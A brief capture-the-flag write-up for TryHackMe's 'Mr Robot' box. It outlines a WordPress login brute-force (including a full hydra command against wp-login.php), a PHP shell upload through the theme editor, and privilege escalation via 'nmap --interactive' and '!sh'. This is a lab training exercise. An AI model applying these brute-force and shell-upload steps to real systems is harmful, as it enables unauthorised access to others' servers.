# Mr Robot 🧭

Names | Details
--------|-----
Source | tryhackme
Level     | medium
Os | linux

**Notes :**





## Gaining Access 😉
- bruteforce: using worlist from  robot.txt
- worpress apperance php shell upload
- exec php using the url

-



## Maintaining Access 🥷
-  linEnum.sh
- nmap --interactive
- !sh
- done


## Important commands 🔥
- hydra brueforce http-pot-form
```
hydra -L user.dic -p test 10.10.102.15 http-post-form "/wp-login.php:log=^user^&pwd=^pwd^:invalid username"
```

## Post Exploitation ✴️
- User flag : /home/user/user.txt
- Root flag : /root/root/root.txt
## Tips 💡
- something


--------------------------------
**By Whois~TCP ** 🤓🖥️










